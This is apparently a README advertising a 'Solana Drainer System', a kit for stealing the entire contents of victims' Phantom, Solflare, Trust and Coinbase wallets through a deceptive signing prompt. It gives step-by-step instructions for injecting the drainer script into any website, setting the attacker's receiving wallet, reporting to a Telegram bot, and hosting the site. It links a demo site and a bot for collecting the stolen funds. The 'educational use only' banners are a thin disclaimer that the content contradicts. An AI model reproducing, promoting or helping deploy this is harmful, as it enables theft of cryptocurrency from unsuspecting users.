#########################################################################################################
 ‼️‼️ This files is dedicated to WEB3.0 learning, protection and Legal Penetration Testing. All information on this files is for educational use only ‼️‼️
#########################################################################################################

# 💯 Solana Drainer System 💯

Provides a fast and easy way to drain user's entire Solana wallets (Phantom, Solflare, Trust Wallet, Coinbase Wallet) - including tokens, NFTs and Solana balance in 1 concealing prompt 👀

Installation on any website files and documentation included 🔥

Installation & Instructions of the draining system on any WEBSITE / solanadrainer.rar

# STEP 1
Please download and attach the index.js file into your website source code and attach the following to your HTML head:
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="/index.js"></script>

# STEP 2
Add your Wallet Adresses & Website in the wallet.js files

const solana_wallet_receiver_id = 'YOUR_SOLANA_WALLET_RECEIVER_ID';
const website_url = 'YOUR_WEBSITE_URL';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);

All is setup your drainer is ready to go. 
Upload your website on Vercel or any Hosting


# WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED : solanadrainertemplate.rar

# DEMO WEBSITE : https://www.trojansolana.xyz
# DRAINER BOT FOR CLAIMING AND LOG : https://t.me/vortexhitsbot

#SOLANA #PHANTOM #NFT #SEAPORT #DRAINERTESTING #BITCOIN #BNB #ETH

#########################################################################################################
 ‼️‼️ This files is dedicated to WEB3.0 learning, protection and Legal Penetration Testing. All information on this files is for educational use only ‼️‼️
#########################################################################################################
